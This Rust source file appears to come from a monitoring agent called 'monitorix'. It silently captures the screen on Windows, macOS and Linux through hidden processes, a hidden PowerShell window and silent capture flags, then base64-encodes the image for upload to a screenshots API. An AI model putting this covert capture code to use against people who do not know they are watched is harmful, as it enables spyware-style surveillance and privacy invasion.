use serde_json::json;

/// Platform-specific save path
#[cfg(target_os = "windows")]
const SAVE_PATH: &str = "C:\\Windows\\Temp\\monitorix_screenshot.png";
#[cfg(target_os = "linux")]
const SAVE_PATH: &str = "/tmp/monitorix_screenshot.png";
#[cfg(target_os = "macos")]
const SAVE_PATH: &str = "/tmp/monitorix_screenshot.png";

/// Capture the primary screen, base64-encode the PNG, and return an upload-ready payload.
/// Returns None if capture fails (e.g. no display).
pub fn capture_screenshot() -> Option<serde_json::Value> {
    let captured = do_capture();
    if !captured {
        return None;
    }

    // Read saved PNG bytes
    let img_bytes = match std::fs::read(SAVE_PATH) {
        Ok(b) if !b.is_empty() => b,
        _ => return None,
    };

    // Base64-encode using stdlib (no extra crate needed)
    let b64 = base64_encode(&img_bytes);

    // Filename: timestamp-based
    let ts = chrono::Utc::now();
    let filename = format!("screenshot_{}.png", ts.format("%Y%m%d_%H%M%S"));

    Some(json!({
        "file_b64":  b64,
        "filename":  filename,
        "timestamp": ts.to_rfc3339(),
        "is_alert":  false,
        // Internal status field for event bus (not sent to /api/screenshots/upload)
        "_EventType": "ScreenshotReady",
    }))
}

// ── Platform capture implementations ─────────────────────────────────────────

#[cfg(target_os = "linux")]
fn do_capture() -> bool {
    // Try scrot first, then gnome-screenshot as fallback
    if let Ok(out) = crate::hidden_command!("scrot")
        .env("DISPLAY", ":0")
        .arg("--overwrite")
        .arg(SAVE_PATH)
        .output()
    {
        if out.status.success() {
            return true;
        }
    }
    // Fallback: import (ImageMagick)
    if let Ok(out) = crate::hidden_command!("import")
        .args(&["-window", "root", SAVE_PATH])
        .env("DISPLAY", ":0")
        .output()
    {
        return out.status.success();
    }
    false
}

#[cfg(target_os = "macos")]
fn do_capture() -> bool {
    crate::hidden_command!("screencapture")
        .args(&["-x", SAVE_PATH])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

#[cfg(target_os = "windows")]
fn do_capture() -> bool {
    let ps_script = r#"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
$Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
$Graphics.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $Bitmap.Size)
$Bitmap.Save("C:\Windows\Temp\monitorix_screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
$Graphics.Dispose()
$Bitmap.Dispose()
"#;
    crate::hidden_command!("powershell")
        .args(&["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps_script])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

#[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
fn do_capture() -> bool { false }

// ── Pure-stdlib base64 encoder (RFC 4648) ────────────────────────────────────
// Avoids adding the `base64` crate dependency.

const B64_CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn base64_encode(input: &[u8]) -> String {
    let mut out = String::with_capacity(((input.len() + 2) / 3) * 4);
    for chunk in input.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(B64_CHARS[((n >> 18) & 0x3F) as usize] as char);
        out.push(B64_CHARS[((n >> 12) & 0x3F) as usize] as char);
        out.push(if chunk.len() > 1 { B64_CHARS[((n >> 6) & 0x3F) as usize] as char } else { '=' });
        out.push(if chunk.len() > 2 { B64_CHARS[(n & 0x3F) as usize] as char } else { '=' });
    }
    out
}
